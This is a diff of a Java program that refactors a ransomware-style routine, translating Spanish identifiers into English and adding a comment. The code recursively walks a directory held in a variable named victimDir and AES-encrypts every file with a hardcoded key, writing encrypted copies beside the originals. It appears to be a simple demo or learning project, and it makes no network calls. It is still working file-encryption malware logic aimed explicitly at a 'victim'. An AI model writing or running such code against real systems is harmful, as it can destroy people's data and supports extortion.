@@ -22,31 +22,34 @@ public class Main {
 	public static void main(String args[]){
 		try {
 			String algorithm = "AES";
-			byte[] clave = new byte[]{1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7};
-			SecretKey secretKey = new SecretKeySpec(clave, algorithm);
+			byte[] key = new byte[]{1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7};
+			SecretKey secretKey = new SecretKeySpec(key, algorithm);
 			cipher = Cipher.getInstance(algorithm);
 			int mode = Cipher.ENCRYPT_MODE;
 			cipher.init(mode, secretKey);
 			
-			cifrar(new File(victimDir));
+			encrypts(new File(victimDir));
 		} catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException e) {
-			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
 	}
 	
-	private static void cifrar(File archivo){
-		if(archivo.isDirectory()) {
-			File archivos[] = archivo.listFiles();
-			for(File a : archivos){
-				cifrar(a);
+	/**
+	 * This method encrypts a directory and all subdirectories and files.
+	 * @param file
+	 */
+	private static void encrypts(File file){
+		if(file.isDirectory()) {
+			File files[] = file.listFiles();
+			for(File a : files){
+				encrypts(a);
 			}
 		} else {
 			try {
-				System.out.println(archivo.getName());
-				FileInputStream fis = new FileInputStream(archivo);
+				System.out.println(file.getName());
+				FileInputStream fis = new FileInputStream(file);
 				int readBytes;
-				FileOutputStream fos = new FileOutputStream(new File(victimDir + "/" + archivo.getName() + "_"));
+				FileOutputStream fos = new FileOutputStream(new File(victimDir + "/" + file.getName() + "_"));
 				do {
 					byte[] bytes = new byte[512];
 					readBytes = fis.read(bytes);
@@ -56,13 +59,10 @@ public class Main {
 				fis.close();
 				fos.close();
 			} catch (IOException e) {
-				// TODO Auto-generated catch block
 				e.printStackTrace();
 			} catch (IllegalBlockSizeException e) {
-				// TODO Auto-generated catch block
 				e.printStackTrace();
 			} catch (BadPaddingException e) {
-				// TODO Auto-generated catch block
 				e.printStackTrace();
 			}
 		}
